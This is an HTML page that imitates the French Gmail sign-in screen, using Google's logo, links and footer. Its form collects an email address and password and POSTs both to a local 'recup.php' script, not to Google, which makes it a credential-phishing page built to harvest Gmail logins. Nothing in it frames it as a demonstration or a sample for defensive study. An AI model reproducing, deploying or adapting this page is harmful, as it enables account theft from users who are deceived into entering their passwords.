<!DOCTYPE html>
<html>
<head>
	<title>Gmail</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script
  src="https://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>
  <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>


</head>
<body>
	<main>
		<section class="principal">
			<img id="googleImg" src="img/Google.gif"/>
			<h2>Connexion</h2>
			<h3>Accéder à Gmail</h3>

				<div class="myForm">
					<div>
						<input id="mail" class="google-inp" type="text" name="mail" placeholder="Adresse e-mail ou numéro de téléphone">
						<a id="forgot" class="forgot" href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&osid=1&service=mail&ss=1&ltmpl=default&rm=false&flowName=GlifWebSignIn&flowEntry=AddSession">Adresse e-mail oubliée ?</a>
						<p class="text">S'il ne s'agit pas de votre ordinateur, utilisez le mode invité pour vous connecter en mode privé. <a id="savoir" href="https://support.google.com/chrome/answer/6130773?hl=fr">En savoir plus</a></p>
						<a id="create" class="create" href="https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default&flowName=GlifWebSignIn&flowEntry=SignUp">Créer un compte</a>
					</div>
					<div>
						<form action="recup.php" method="POST">
							<input id="hiddenMail" type="hidden" name="email">
							<input type="text" class="google-inp" name="psw" placeholder="Saisissez votre mot de passe">
							<a class="forgot" id="forgot2" href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&osid=1&service=mail&ss=1&ltmpl=default&rm=false&flowName=GlifWebSignIn&flowEntry=AddSession">Mot de passe oublié ?</a>
							<input id="send" type="submit" value="envoyer">
						</form>
					</div>
				</div>
				</section>
				<footer>
					<div class="formfield-select footer-div">
						<div id="country-container"  class="formfield-select--container">
							<select name="pays" id="mon_select"> 
								<option value="France" selected="selected">Français (France) </option>

								<option value="Afghanistan">Afghanistan </option>
								<option value="Afrique_Centrale">Afrique_Centrale </option>
								<option value="Afrique_du_sud">Afrique_du_Sud </option> 
								<option value="Albanie">Albanie </option>
								<option value="Algerie">Algerie </option>
								<option value="Allemagne">Allemagne </option>
								<option value="Andorre">Andorre </option>
								<option value="Angola">Angola </option>
								<option value="Anguilla">Anguilla </option>
								<option value="Arabie_Saoudite">Arabie_Saoudite </option>
								<option value="Argentine">Argentine </option>
								<option value="Armenie">Armenie </option> 
								<option value="Australie">Australie </option>
								<option value="Autriche">Autriche </option>
								<option value="Azerbaidjan">Azerbaidjan </option>

								<option value="Bahamas">Bahamas </option>
								<option value="Bangladesh">Bangladesh </option>
								<option value="Barbade">Barbade </option>
								<option value="Bahrein">Bahrein </option>
								<option value="Belgique">Belgique </option>
								<option value="Belize">Belize </option>
								<option value="Benin">Benin </option>
								<option value="Bermudes">Bermudes </option>
								<option value="Bielorussie">Bielorussie </option>
								<option value="Bolivie">Bolivie </option>
								<option value="Botswana">Botswana </option>
								<option value="Bhoutan">Bhoutan </option>
								<option value="Boznie_Herzegovine">Boznie_Herzegovine </option>
								<option value="Bresil">Bresil </option>
								<option value="Brunei">Brunei </option>
								<option value="Bulgarie">Bulgarie </option>
								<option value="Burkina_Faso">Burkina_Faso </option>
								<option value="Burundi">Burundi </option>

								<option value="Caiman">Caiman </option>
								<option value="Cambodge">Cambodge </option>
								<option value="Cameroun">Cameroun </option>
								<option value="Canada">Canada </option>
								<option value="Canaries">Canaries </option>
								<option value="Cap_vert">Cap_Vert </option>
								<option value="Chili">Chili </option>
								<option value="Chine">Chine </option> 
								<option value="Chypre">Chypre </option> 
								<option value="Colombie">Colombie </option>
								<option value="Comores">Colombie </option>
								<option value="Congo">Congo </option>
								<option value="Congo_democratique">Congo_democratique </option>
								<option value="Cook">Cook </option>
								<option value="Coree_du_Nord">Coree_du_Nord </option>
								<option value="Coree_du_Sud">Coree_du_Sud </option>
								<option value="Costa_Rica">Costa_Rica </option>
								<option value="Cote_d_Ivoire">Côte_d_Ivoire </option>
								<option value="Croatie">Croatie </option>
								<option value="Cuba">Cuba </option>

								<option value="Danemark">Danemark </option>
								<option value="Djibouti">Djibouti </option>
								<option value="Dominique">Dominique </option>

								<option value="Egypte">Egypte </option> 
								<option value="Emirats_Arabes_Unis">Emirats_Arabes_Unis </option>
								<option value="Equateur">Equateur </option>
								<option value="Erythree">Erythree </option>
								<option value="Espagne">Espagne </option>
								<option value="Estonie">Estonie </option>
								<option value="Etats_Unis">Etats_Unis </option>
								<option value="Ethiopie">Ethiopie </option>

								<option value="Falkland">Falkland </option>
								<option value="Feroe">Feroe </option>
								<option value="Fidji">Fidji </option>
								<option value="Finlande">Finlande </option>
								<option value="France">France </option>

								<option value="Gabon">Gabon </option>
								<option value="Gambie">Gambie </option>
								<option value="Georgie">Georgie </option>
								<option value="Ghana">Ghana </option>
								<option value="Gibraltar">Gibraltar </option>
								<option value="Grece">Grece </option>
								<option value="Grenade">Grenade </option>
								<option value="Groenland">Groenland </option>
								<option value="Guadeloupe">Guadeloupe </option>
								<option value="Guam">Guam </option>
								<option value="Guatemala">Guatemala</option>
								<option value="Guernesey">Guernesey </option>
								<option value="Guinee">Guinee </option>
								<option value="Guinee_Bissau">Guinee_Bissau </option>
								<option value="Guinee equatoriale">Guinee_Equatoriale </option>
								<option value="Guyana">Guyana </option>
								<option value="Guyane_Francaise ">Guyane_Francaise </option>

								<option value="Haiti">Haiti </option>
								<option value="Hawaii">Hawaii </option> 
								<option value="Honduras">Honduras </option>
								<option value="Hong_Kong">Hong_Kong </option>
								<option value="Hongrie">Hongrie </option>

								<option value="Inde">Inde </option>
								<option value="Indonesie">Indonesie </option>
								<option value="Iran">Iran </option>
								<option value="Iraq">Iraq </option>
								<option value="Irlande">Irlande </option>
								<option value="Islande">Islande </option>
								<option value="Israel">Israel </option>
								<option value="Italie">italie </option>

								<option value="Jamaique">Jamaique </option>
								<option value="Jan Mayen">Jan Mayen </option>
								<option value="Japon">Japon </option>
								<option value="Jersey">Jersey </option>
								<option value="Jordanie">Jordanie </option>

								<option value="Kazakhstan">Kazakhstan </option>
								<option value="Kenya">Kenya </option>
								<option value="Kirghizstan">Kirghizistan </option>
								<option value="Kiribati">Kiribati </option>
								<option value="Koweit">Koweit </option>

								<option value="Laos">Laos </option>
								<option value="Lesotho">Lesotho </option>
								<option value="Lettonie">Lettonie </option>
								<option value="Liban">Liban </option>
								<option value="Liberia">Liberia </option>
								<option value="Liechtenstein">Liechtenstein </option>
								<option value="Lituanie">Lituanie </option> 
								<option value="Luxembourg">Luxembourg </option>
								<option value="Lybie">Lybie </option>

								<option value="Macao">Macao </option>
								<option value="Macedoine">Macedoine </option>
								<option value="Madagascar">Madagascar </option>
								<option value="Madère">Madère </option>
								<option value="Malaisie">Malaisie </option>
								<option value="Malawi">Malawi </option>
								<option value="Maldives">Maldives </option>
								<option value="Mali">Mali </option>
								<option value="Malte">Malte </option>
								<option value="Man">Man </option>
								<option value="Mariannes du Nord">Mariannes du Nord </option>
								<option value="Maroc">Maroc </option>
								<option value="Marshall">Marshall </option>
								<option value="Martinique">Martinique </option>
								<option value="Maurice">Maurice </option>
								<option value="Mauritanie">Mauritanie </option>
								<option value="Mayotte">Mayotte </option>
								<option value="Mexique">Mexique </option>
								<option value="Micronesie">Micronesie </option>
								<option value="Midway">Midway </option>
								<option value="Moldavie">Moldavie </option>
								<option value="Monaco">Monaco </option>
								<option value="Mongolie">Mongolie </option>
								<option value="Montserrat">Montserrat </option>
								<option value="Mozambique">Mozambique </option>

								<option value="Namibie">Namibie </option>
								<option value="Nauru">Nauru </option>
								<option value="Nepal">Nepal </option>
								<option value="Nicaragua">Nicaragua </option>
								<option value="Niger">Niger </option>
								<option value="Nigeria">Nigeria </option>
								<option value="Niue">Niue </option>
								<option value="Norfolk">Norfolk </option>
								<option value="Norvege">Norvege </option>
								<option value="Nouvelle_Caledonie">Nouvelle_Caledonie </option>
								<option value="Nouvelle_Zelande">Nouvelle_Zelande </option>

								<option value="Oman">Oman </option>
								<option value="Ouganda">Ouganda </option>
								<option value="Ouzbekistan">Ouzbekistan </option>

								<option value="Pakistan">Pakistan </option>
								<option value="Palau">Palau </option>
								<option value="Palestine">Palestine </option>
								<option value="Panama">Panama </option>
								<option value="Papouasie_Nouvelle_Guinee">Papouasie_Nouvelle_Guinee </option>
								<option value="Paraguay">Paraguay </option>
								<option value="Pays_Bas">Pays_Bas </option>
								<option value="Perou">Perou </option>
								<option value="Philippines">Philippines </option> 
								<option value="Pologne">Pologne </option>
								<option value="Polynesie">Polynesie </option>
								<option value="Porto_Rico">Porto_Rico </option>
								<option value="Portugal">Portugal </option>

								<option value="Qatar">Qatar </option>

								<option value="Republique_Dominicaine">Republique_Dominicaine </option>
								<option value="Republique_Tcheque">Republique_Tcheque </option>
								<option value="Reunion">Reunion </option>
								<option value="Roumanie">Roumanie </option>
								<option value="Royaume_Uni">Royaume_Uni </option>
								<option value="Russie">Russie </option>
								<option value="Rwanda">Rwanda </option>

								<option value="Sahara Occidental">Sahara Occidental </option>
								<option value="Sainte_Lucie">Sainte_Lucie </option>
								<option value="Saint_Marin">Saint_Marin </option>
								<option value="Salomon">Salomon </option>
								<option value="Salvador">Salvador </option>
								<option value="Samoa_Occidentales">Samoa_Occidentales</option>
								<option value="Samoa_Americaine">Samoa_Americaine </option>
								<option value="Sao_Tome_et_Principe">Sao_Tome_et_Principe </option> 
								<option value="Senegal">Senegal </option> 
								<option value="Seychelles">Seychelles </option>
								<option value="Sierra Leone">Sierra Leone </option>
								<option value="Singapour">Singapour </option>
								<option value="Slovaquie">Slovaquie </option>
								<option value="Slovenie">Slovenie</option>
								<option value="Somalie">Somalie </option>
								<option value="Soudan">Soudan </option> 
								<option value="Sri_Lanka">Sri_Lanka </option> 
								<option value="Suede">Suede </option>
								<option value="Suisse">Suisse </option>
								<option value="Surinam">Surinam </option>
								<option value="Swaziland">Swaziland </option>
								<option value="Syrie">Syrie </option>

								<option value="Tadjikistan">Tadjikistan </option>
								<option value="Taiwan">Taiwan </option>
								<option value="Tonga">Tonga </option>
								<option value="Tanzanie">Tanzanie </option>
								<option value="Tchad">Tchad </option>
								<option value="Thailande">Thailande </option>
								<option value="Tibet">Tibet </option>
								<option value="Timor_Oriental">Timor_Oriental </option>
								<option value="Togo">Togo </option> 
								<option value="Trinite_et_Tobago">Trinite_et_Tobago </option>
								<option value="Tristan da cunha">Tristan de cuncha </option>
								<option value="Tunisie">Tunisie </option>
								<option value="Turkmenistan">Turmenistan </option> 
								<option value="Turquie">Turquie </option>

								<option value="Ukraine">Ukraine </option>
								<option value="Uruguay">Uruguay </option>

								<option value="Vanuatu">Vanuatu </option>
								<option value="Vatican">Vatican </option>
								<option value="Venezuela">Venezuela </option>
								<option value="Vierges_Americaines">Vierges_Americaines </option>
								<option value="Vierges_Britanniques">Vierges_Britanniques </option>
								<option value="Vietnam">Vietnam </option>

								<option value="Wake">Wake </option>
								<option value="Wallis et Futuma">Wallis et Futuma </option>

								<option value="Yemen">Yemen </option>
								<option value="Yougoslavie">Yougoslavie </option>

								<option value="Zambie">Zambie </option>
								<option value="Zimbabwe">Zimbabwe </option>

								</select>
						</div>
					</div>
					<div class="footer-div help">
						<a href="https://support.google.com/accounts?hl=fr#topic=3382296">Aide</a>
					</div>
					<div class="footer-div confi">
						<a href="https://policies.google.com/privacy?gl=FR&hl=fr">Confidentialité</a>
					</div>
					<div class="footer-div condition">
						<a href="https://policies.google.com/terms?gl=FR&hl=fr">Condition d'utilisation</a>
					</div>

				</footer>
					


		</main>
	<script type="text/javascript" src="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
</body>
</html>

<script type="text/javascript">
	$(document).ready(function(){




  $('.myForm').slick({
  	 infinite: true,
  	slidesToShow: 1,
  	slidesToScroll: 1
  });

  $('.slick-prev').css('display', 'none');
  $('.slick-next').text('Suivant');

	$('.slick-next').on('click', function() {
		$('#hiddenMail').val($('#mail').val());
		$('.slick-next').css('display', 'none');
		$('h2').text('Bienvenue');
		$('h3').addClass('user');
		$('h3').html('<svg xmlns="https://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 48 48" fill="#4285f4" aria-hidden="true" focusable="false"><path d="M24,0C10.74,0 0,10.74 0,24C0,37.26 10.74,48 24,48C37.26,48 48,37.26 48,24C48,10.74 37.26,0 24,0ZM24,41.28C17.988,41.28 12.708,38.208 9.6,33.552C9.66,28.788 19.212,26.16 24,26.16C28.788,26.16 38.328,28.788 38.4,33.552C35.292,38.208 30.012,41.28 24,41.28ZM24,7.2C27.972,7.2 31.2,10.428 31.2,14.4C31.2,18.384 27.972,21.6 24,21.6C20.028,21.6 16.8,18.384 16.8,14.4C16.8,10.428 20.028,7.2 24,7.2Z"></path><path d="M0 0h48v48H0z" fill="none"></path></svg> <span>'+$('#mail').val()+'</span>');
	}); 

});


		
</script>